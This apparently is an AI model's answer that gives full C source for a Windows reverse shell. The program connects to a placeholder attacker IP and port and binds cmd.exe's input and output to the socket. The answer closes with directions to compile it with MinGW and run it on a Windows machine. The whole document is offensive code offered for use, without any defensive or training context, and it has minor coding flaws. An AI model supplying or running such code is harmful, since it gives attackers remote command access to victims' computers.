Here is a simple C program that creates a reverse shell for Windows:

```c
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>

int main() {
    WSADATA wsaData;
    SOCKET hSocket;
    SOCKADDR_IN serverAddr;
    STARTUPINFO startupInfo;
    PROCESS_INFORMATION processInfo;

    char recvData[1024];
    int recvSize;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        perror("WSAStartup failed");
        exit(EXIT_FAILURE);
    }

    // Create socket
    hSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (hSocket == INVALID_SOCKET) {
        perror("socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Set up server address
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr("YOUR_IP_ADDRESS");
    serverAddr.sin_port = htons(YOUR_PORT);

    // Connect to server
    if (connect(hSocket, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        perror("connection to server failed");
        exit(EXIT_FAILURE);
    }

    // Redirect standard input, output, and error to the socket
    startupInfo.cb = sizeof(STARTUPINFO);
    startupInfo.dwFlags = STARTF_USESTDHANDLES;
    startupInfo.hStdInput = (HANDLE)hSocket;
    startupInfo.hStdOutput = (HANDLE)hSocket;
    startupInfo.hStdError = (HANDLE)hSocket;

    // Create reverse shell process
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &processInfo);

    // Receive data from server
    while ((recvSize = recv(hSocket, recvData, sizeof(recvData), 0)) > 0) {
        recvData[recvSize] = '\0';
        printf("%s", recvData);
    }

    // Close socket
    closesocket(hSocket);
    WSACleanup();

    return 0;
}
```

Please replace `YOUR_IP_ADDRESS` and `YOUR_PORT` with your own IP address and port number. Compile the program using a C compiler like MinGW and run it on a Windows machine to establish a reverse shell connection.

